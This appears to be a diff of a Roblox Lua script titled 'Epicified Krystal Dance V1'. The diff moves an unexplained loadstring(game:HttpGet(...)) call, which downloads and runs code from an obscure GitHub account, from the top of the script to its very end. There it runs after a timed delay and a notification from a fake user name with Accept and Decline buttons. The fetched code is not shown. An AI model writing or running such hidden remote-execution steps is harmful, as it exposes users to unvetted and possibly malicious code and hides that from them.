@@ -1,8 +1,6 @@
 if not getgenv()["Animator"] then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xhayper/Animator/main/Source/Main.lua"))()
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
-end
 task.wait(2.750)
 local player = game:GetService("Players").LocalPlayer
     local character = player.Character
@@ -1845,7 +1843,7 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 	Duration = 2;
 	Text = "Epicified Krystal Dance V1"
 })
-task.wait(20)
+task.wait(10)
 local StarterGui = game:GetService("StarterGui")
 
 local fakeUser = "coolkevin12232"
@@ -1995,3 +1993,5 @@ StarterGui:SetCore("SendNotification", {
 	Button1 = "Accept",
 	Button2 = "Decline"
 })
+task.wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
